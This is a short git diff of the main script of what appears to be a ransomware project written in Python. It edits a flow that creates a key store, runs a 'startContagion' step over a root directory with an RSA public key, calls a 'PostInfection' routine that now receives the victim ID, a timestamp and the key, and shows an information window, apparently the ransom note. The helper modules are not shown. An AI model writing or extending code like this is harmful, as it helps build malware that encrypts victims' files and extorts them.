@@ -3,7 +3,7 @@ from base64 import b64decode
 import starter
 import guiMode
 from postInfection import PostInfection
-from utils import root_directory, aesIV_file_store_path
+from utils import root_directory, aesIV_file_store_path,when_did_i_work
 
 if starter.checkFirstTime():
     with open("config.txt","r") as configFile:
@@ -14,7 +14,7 @@ if starter.checkFirstTime():
 
     starter.keyStoreCreate(version, what_is_my_id)
     starter.startContagion(root_directory, rsa_public_key)
-    PostInfection("online").firstWork()
+    PostInfection(what_is_my_id , "online", when_did_i_work, rsa_public_key).firstWork()
     guiMode.displayInfoGUI(aesIV_file_store_path)
 
 else:
